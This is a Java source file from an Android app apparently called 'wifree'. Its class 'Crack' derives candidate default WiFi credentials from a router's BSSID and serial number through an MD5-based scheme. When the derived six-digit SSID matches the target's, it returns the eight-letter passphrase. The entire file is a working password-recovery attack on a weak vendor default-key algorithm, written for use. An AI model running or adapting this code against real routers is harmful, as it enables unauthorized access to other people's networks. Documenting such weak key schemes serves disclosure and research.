package com.github.markszabo.wifree;

import android.util.Log;

import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class Crack {
    private String SSID;
    private String BSSID;

    public Crack(String SSID, String BSSID){
        this.SSID = SSID;
        this.BSSID = BSSID.toLowerCase();
    }

    public int getVal(byte v0) {
        int ret = ((((v0 << 1) + v0) << 3)+ v0) >> 6;
        while(ret < 0) {
            ret += 100;
        }
        return ret;
    }

    public int getVal(String v0) {
        return getVal(v0.getBytes()[0]);
    }

    public String[] genSSID_PSK(String mac, int serial) {
        String text = mac + "-" + String.valueOf(serial);

        byte[] bytesOfMessage = new byte[0];
        try {
            bytesOfMessage = text.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        byte[] m = new byte[0];
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            m = md.digest(bytesOfMessage);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        String ssid = String.format("%02d%02d%02d",getVal(m[0]),getVal(m[1]),getVal(m[2]));

        String psk = "";

        for(int i=0; i<8; i++) {
            byte v0 = m[3+i];
            int newchar = (0x41 + (((((v0<<1)+v0)<<2)+v0)>>7));
            if(newchar < (int)'A') {
                newchar += 26;
            }
            psk += (char) newchar;
        }

        return new String[]{ssid, psk};
    }

    public String getPSK(int serial) {
        String[] SSID_PSK = genSSID_PSK(this.BSSID, serial);
        if(this.SSID.equals(SSID_PSK[0])) {
            return SSID_PSK[1];
        } else {
            return null;
        }
    }
}
